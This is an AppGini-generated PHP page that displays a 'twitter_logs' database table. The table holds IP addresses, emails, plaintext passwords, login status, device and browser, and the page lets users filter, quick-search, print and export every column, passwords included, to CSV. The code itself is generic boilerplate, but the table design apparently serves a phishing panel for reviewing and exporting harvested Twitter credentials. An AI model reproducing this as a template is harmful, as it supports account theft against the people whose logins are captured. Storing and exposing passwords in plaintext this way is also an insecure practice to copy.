<?php
// This script and data application were generated by AppGini 22.14
// Download AppGini for free from https://bigprof.com/appgini/download/

	include_once(__DIR__ . '/lib.php');
	@include_once(__DIR__ . '/hooks/twitter_logs.php');
	include_once(__DIR__ . '/twitter_logs_dml.php');

	// mm: can the current member access this page?
	$perm = getTablePermissions('twitter_logs');
	if(!$perm['access']) {
		echo error_message($Translation['tableAccessDenied']);
		exit;
	}

	$x = new DataList;
	$x->TableName = 'twitter_logs';

	// Fields that can be displayed in the table view
	$x->QueryFieldsTV = [
		"`twitter_logs`.`id`" => "id",
		"`twitter_logs`.`ip`" => "ip",
		"`twitter_logs`.`time`" => "time",
		"`twitter_logs`.`email`" => "email",
		"`twitter_logs`.`password`" => "password",
		"`twitter_logs`.`status`" => "status",
		"`twitter_logs`.`status_info`" => "status_info",
		"`twitter_logs`.`device`" => "device",
		"`twitter_logs`.`browser`" => "browser",
		"`twitter_logs`.`mode`" => "mode",
		"`twitter_logs`.`user_id`" => "user_id",
		"`twitter_logs`.`source_id`" => "source_id",
	];
	// mapping incoming sort by requests to actual query fields
	$x->SortFields = [
		1 => '`twitter_logs`.`id`',
		2 => 2,
		3 => 3,
		4 => 4,
		5 => 5,
		6 => 6,
		7 => 7,
		8 => 8,
		9 => 9,
		10 => 10,
		11 => 11,
		12 => 12,
	];

	// Fields that can be displayed in the csv file
	$x->QueryFieldsCSV = [
		"`twitter_logs`.`id`" => "id",
		"`twitter_logs`.`ip`" => "ip",
		"`twitter_logs`.`time`" => "time",
		"`twitter_logs`.`email`" => "email",
		"`twitter_logs`.`password`" => "password",
		"`twitter_logs`.`status`" => "status",
		"`twitter_logs`.`status_info`" => "status_info",
		"`twitter_logs`.`device`" => "device",
		"`twitter_logs`.`browser`" => "browser",
		"`twitter_logs`.`mode`" => "mode",
		"`twitter_logs`.`user_id`" => "user_id",
		"`twitter_logs`.`source_id`" => "source_id",
	];
	// Fields that can be filtered
	$x->QueryFieldsFilters = [
		"`twitter_logs`.`id`" => "Id",
		"`twitter_logs`.`ip`" => "Ip",
		"`twitter_logs`.`time`" => "Time",
		"`twitter_logs`.`email`" => "Email",
		"`twitter_logs`.`password`" => "Password",
		"`twitter_logs`.`status`" => "Status",
		"`twitter_logs`.`status_info`" => "Status_info",
		"`twitter_logs`.`device`" => "Device",
		"`twitter_logs`.`browser`" => "Browser",
		"`twitter_logs`.`mode`" => "Mode",
		"`twitter_logs`.`user_id`" => "User_id",
		"`twitter_logs`.`source_id`" => "Source_id",
	];

	// Fields that can be quick searched
	$x->QueryFieldsQS = [
		"`twitter_logs`.`id`" => "id",
		"`twitter_logs`.`ip`" => "ip",
		"`twitter_logs`.`time`" => "time",
		"`twitter_logs`.`email`" => "email",
		"`twitter_logs`.`password`" => "password",
		"`twitter_logs`.`status`" => "status",
		"`twitter_logs`.`status_info`" => "status_info",
		"`twitter_logs`.`device`" => "device",
		"`twitter_logs`.`browser`" => "browser",
		"`twitter_logs`.`mode`" => "mode",
		"`twitter_logs`.`user_id`" => "user_id",
		"`twitter_logs`.`source_id`" => "source_id",
	];

	// Lookup fields that can be used as filterers
	$x->filterers = [];

	$x->QueryFrom = "`twitter_logs` ";
	$x->QueryWhere = '';
	$x->QueryOrder = '';

	$x->AllowSelection = 1;
	$x->HideTableView = ($perm['view'] == 0 ? 1 : 0);
	$x->AllowDelete = $perm['delete'];
	$x->AllowMassDelete = (getLoggedAdmin() !== false);
	$x->AllowInsert = $perm['insert'];
	$x->AllowUpdate = $perm['edit'];
	$x->SeparateDV = 1;
	$x->AllowDeleteOfParents = 0;
	$x->AllowFilters = 1;
	$x->AllowSavingFilters = 1;
	$x->AllowSorting = 1;
	$x->AllowNavigation = 1;
	$x->AllowPrinting = 1;
	$x->AllowPrintingDV = 1;
	$x->AllowCSV = 1;
	$x->RecordsPerPage = 10;
	$x->QuickSearch = 1;
	$x->QuickSearchText = $Translation['quick search'];
	$x->ScriptFileName = 'twitter_logs_view.php';
	$x->TableTitle = 'Twitter_logs';
	$x->TableIcon = 'resources/table_icons/twitter_2.png';
	$x->PrimaryKey = '`twitter_logs`.`id`';

	$x->ColWidth = [150, 150, 150, 150, 150, 150, 150, 150, 150, 150, 150, 150, ];
	$x->ColCaption = ['Id', 'Ip', 'Time', 'Email', 'Password', 'Status', 'Status_info', 'Device', 'Browser', 'Mode', 'User_id', 'Source_id', ];
	$x->ColFieldName = ['id', 'ip', 'time', 'email', 'password', 'status', 'status_info', 'device', 'browser', 'mode', 'user_id', 'source_id', ];
	$x->ColNumber  = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, ];

	// template paths below are based on the app main directory
	$x->Template = 'templates/twitter_logs_templateTV.html';
	$x->SelectedTemplate = 'templates/twitter_logs_templateTVS.html';
	$x->TemplateDV = 'templates/twitter_logs_templateDV.html';
	$x->TemplateDVP = 'templates/twitter_logs_templateDVP.html';

	$x->ShowTableHeader = 1;
	$x->TVClasses = "";
	$x->DVClasses = "";
	$x->HasCalculatedFields = false;
	$x->AllowConsoleLog = false;
	$x->AllowDVNavigation = true;

	// hook: twitter_logs_init
	$render = true;
	if(function_exists('twitter_logs_init')) {
		$args = [];
		$render = twitter_logs_init($x, getMemberInfo(), $args);
	}

	if($render) $x->Render();

	// hook: twitter_logs_header
	$headerCode = '';
	if(function_exists('twitter_logs_header')) {
		$args = [];
		$headerCode = twitter_logs_header($x->ContentType, getMemberInfo(), $args);
	}

	if(!$headerCode) {
		include_once(__DIR__ . '/header.php'); 
	} else {
		ob_start();
		include_once(__DIR__ . '/header.php');
		echo str_replace('<%%HEADER%%>', ob_get_clean(), $headerCode);
	}

	echo $x->HTML;

	// hook: twitter_logs_footer
	$footerCode = '';
	if(function_exists('twitter_logs_footer')) {
		$args = [];
		$footerCode = twitter_logs_footer($x->ContentType, getMemberInfo(), $args);
	}

	if(!$footerCode) {
		include_once(__DIR__ . '/footer.php'); 
	} else {
		ob_start();
		include_once(__DIR__ . '/footer.php');
		echo str_replace('<%%FOOTER%%>', ob_get_clean(), $footerCode);
	}
